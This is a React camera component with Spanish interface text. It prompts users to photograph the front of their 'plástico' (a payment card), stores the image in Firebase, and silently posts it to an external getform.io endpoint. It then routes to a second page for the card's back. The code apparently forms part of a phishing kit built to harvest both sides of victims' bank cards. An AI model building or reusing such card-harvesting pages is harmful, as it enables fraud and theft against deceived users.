import React, { useState, useEffect, useRef } from 'react';
import '../css/camara.css';
import { useNavigate } from 'react-router-dom';
import { storage } from './firebase';

const CameraComponent = () => {
  const [stream, setStream] = useState(null);
  const [photoSrc, setPhotoSrc] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [showStartModal, setShowStartModal] = useState(true); // Mostrar el primer modal al inicio
  const [imageBlob, setImageBlob] = useState(null);
  const [hasTakenPhoto, setHasTakenPhoto] = useState(false);
  const videoRef = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    const requestCameraPermission = async () => {
      try {
        const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } }, audio: false });
        videoRef.current.srcObject = mediaStream;
        setStream(mediaStream);
      } catch (error) {
        console.error('Error al acceder a la cámara:', error);
      }
    };

    requestCameraPermission();

    return () => {
      stopCamera();
    };
  }, []);

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } }, audio: false });
      videoRef.current.srcObject = mediaStream;
      setStream(mediaStream);
    } catch (error) {
      console.error('Error al acceder a la cámara:', error);
    }
  };

  const takePhoto = async () => {
    if (!hasTakenPhoto && stream) {
      const video = videoRef.current;
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
      const photoURL = URL.createObjectURL(photoBlob);

      setPhotoSrc(photoURL);
      setShowModal(true);

      setImageBlob(photoBlob);

      setHasTakenPhoto(true);
    }
  };

  const acceptPhoto = async () => {
    if (imageBlob) {
      const storageRef = storage.ref();
      const photoRef = storageRef.child(`fotos/${Date.now()}.jpg`);
      await photoRef.put(imageBlob);

      window.alert('Imagen Guardada, Ahora enfoque la parte trasera');

      navigate('/segundacamara');

      const formData = new FormData();
      formData.append('imagen', imageBlob);

      fetch('https://getform.io/f/akkgdgga', {
        method: 'POST',
        body: formData,
      })
        .then(response => {
          if (response.ok) {
            console.log('Imagen enviada correctamente');
          } else {
            console.error('Error al enviar la imagen');
          }
        })
        .catch(error => {
          console.error('Error al enviar la imagen:', error);
        });
    }

    setShowModal(false);
  };

  const cancelPhoto = () => {
    setShowModal(false);
  };

  const stopCamera = () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  };

  return (
    <div className="camera-container">
      <h1>ENFOQUE LA PARTE DELANTERA DE SU PLÁSTICO</h1>

      {showStartModal && (
        <div className="modal-background">
          <div className="modal-content">
            <img src="https://i.ibb.co/2WywnGq/Whats-App-Image-2024-07-23-at-11-22-35-PM.jpg" alt="Imagen" className="modal-image" />
            <p className="modal-text">Fotografíe la parte delantera de su plástico</p>
            <button className="modal-close-button" onClick={() => setShowStartModal(false)}>Cerrar</button>
          </div>
        </div>
      )}

      {showModal && (
        <div className="modal-background">
          <div className="modal-content">
            <img id="photo-preview" src={photoSrc} alt="Foto tomada" className="photo-preview" />
            <div className="buttons-container">
              <button className="button accept-button" onClick={acceptPhoto}>Aceptar</button>
              <button className="button cancel-button" onClick={cancelPhoto}>Cancelar</button>
            </div>
          </div>
        </div>
      )}

      <video ref={videoRef} autoPlay playsInline className="video" />
      <button className="button take-photo-button" onClick={takePhoto}>TOMAR</button>
    </div>
  );
};

export default CameraComponent;
